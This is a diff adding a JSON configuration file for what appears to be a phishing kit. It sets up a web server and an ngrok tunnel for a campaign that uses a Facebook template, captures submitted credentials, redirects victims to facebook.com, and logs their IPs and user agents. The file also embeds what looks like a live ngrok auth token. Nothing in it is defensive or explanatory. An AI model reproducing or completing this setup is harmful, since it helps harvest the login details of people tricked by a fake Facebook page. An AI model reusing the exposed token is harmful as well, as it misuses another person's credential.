@@ -1,0 +1,24 @@
+{
+  "server": {
+    "host": "0.0.0.0",
+    "port": 8080,
+    "ssl": false,
+    "ssl_cert": "",
+    "ssl_key": ""
+  },
+  "tunnel": {
+    "enabled": false,
+    "provider": "ngrok",
+    "ngrok_auth_token": "3EUek75LEIbTTfuk3C9MOMHQusJ_5dNUYDZSsCcArkR6Zngwf",
+    "cloudflare_api_token": ""
+  },
+  "campaign": {
+    "template": "facebook",
+    "redirect_url": "https://www.facebook.com",
+    "capture_credentials": true,
+    "capture_otp": false,
+    "log_ips": true,
+    "log_user_agents": true,
+    "log_geolocation": false
+  }
+}
